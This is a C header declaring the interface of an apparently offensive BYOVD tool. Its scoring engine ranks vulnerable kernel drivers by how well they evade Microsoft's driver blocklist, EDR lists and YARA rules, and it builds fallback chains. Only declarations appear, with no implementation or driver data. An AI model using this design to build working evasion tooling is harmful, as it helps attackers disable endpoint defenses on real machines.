/*
 * Driver Intelligence Scoring Engine - Header
 * Multi-Tier Fallback Chain for BYOVD Driver Selection
 */

#ifndef BYOVD_DRIVER_SCORING_H
#define BYOVD_DRIVER_SCORING_H

#include <stdint.h>
#include <stdlib.h>
#include "byovd_manifest.h"

#ifdef __cplusplus
extern "C" {
#endif

typedef struct {
    const char*        name;
    uint32_t           sha256_low;
    uint32_t           sha256_high;
    uint32_t           release_timestamp;
    uint32_t           compilation_date;
    uint32_t           size_bytes;
    int                is_signed;
    int                is_microsoft_blocked;
    int                is_on_edr_list;
    int                sig_revoked;
    int                yara_matches;
    uint32_t*          capabilities;
    int                capability_count;
    const char*        device_path;
    const char*        service_name;
} BYOVD_DRIVER_METADATA;

typedef struct {
    int                count;
    BYOVD_DRIVER_METADATA* drivers;
} BYOVD_DRIVER_MANIFEST;

typedef struct {
    BYOVD_DRIVER_METADATA* metadata;
    int                score;
    int                evasion_score;
    int                prevalence_score;
    int                capability_score;
    int                blocklist_score;
} BYOVD_DRIVER_CANDIDATE;

int byovd_score_driver_evasion(const char* driver_name, const BYOVD_DRIVER_METADATA* metadata);

int byovd_score_driver_prevalence(const char* driver_name, const BYOVD_DRIVER_METADATA* metadata);

int byovd_score_driver_capability(const char* driver_name, uint32_t required_capabilities);

int byovd_score_driver_blocklist(const char* driver_name, const BYOVD_DRIVER_METADATA* metadata);

int byovd_score_driver_composite(const char* driver_name, const BYOVD_DRIVER_METADATA* metadata, uint32_t required_capabilities);

BYOVD_DRIVER_CANDIDATE* byovd_select_driver(
    const BYOVD_DRIVER_MANIFEST* manifest,
    uint32_t required_capabilities,
    int* out_count);

const char* byovd_select_best_driver(
    const BYOVD_DRIVER_MANIFEST* manifest,
    uint32_t required_capabilities);

const char** byovd_get_driver_fallback_chain(
    const BYOVD_DRIVER_MANIFEST* manifest,
    uint32_t required_capabilities,
    int chain_size,
    int* out_count);

#ifdef __cplusplus
}
#endif

#endif /* BYOVD_DRIVER_SCORING_H */
